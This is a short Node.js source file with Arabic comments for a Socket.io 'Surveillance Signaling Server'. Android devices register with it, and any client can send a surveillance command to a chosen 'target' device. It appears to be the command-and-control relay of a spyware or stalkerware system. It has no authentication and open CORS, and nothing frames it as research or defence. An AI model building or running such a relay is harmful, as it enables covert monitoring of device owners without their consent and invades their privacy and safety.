const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);

// إعداد Socket.io للسماح بالاتصال
const io = new Server(server, {
  cors: { origin: '*' }
});

app.get('/', (req, res) => {
  res.send('Surveillance Signaling Server is Running Live!');
});

io.on('connection', (socket) => {
  console.log('جهاز متصل جديد:', socket.id);

  // استقبال حدث تسجيل الجهاز القادم من تطبيق الأندرويد
  socket.on('register-device', (deviceName) => {
    console.log(`تم تسجيل الجهاز بنجاح: ${deviceName} بمعرف الاتصال: ${socket.id}`);
    socket.data.deviceName = deviceName;
  });

  // إرسال أمر المراقبة إلى التطبيق المستهدف عند الطلب
  socket.on('trigger-surveillance', (targetSocketId) => {
    io.to(targetSocketId).emit('request-surveillance');
    console.log(`تم إرسال أمر المراقبة للجهاز: ${targetSocketId}`);
  });

  socket.on('disconnect', () => {
    console.log('جهاز قطع الاتصال:', socket.id);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`السيرفر يعمل الآن بنجاح على المنفذ: ${PORT}`);
});
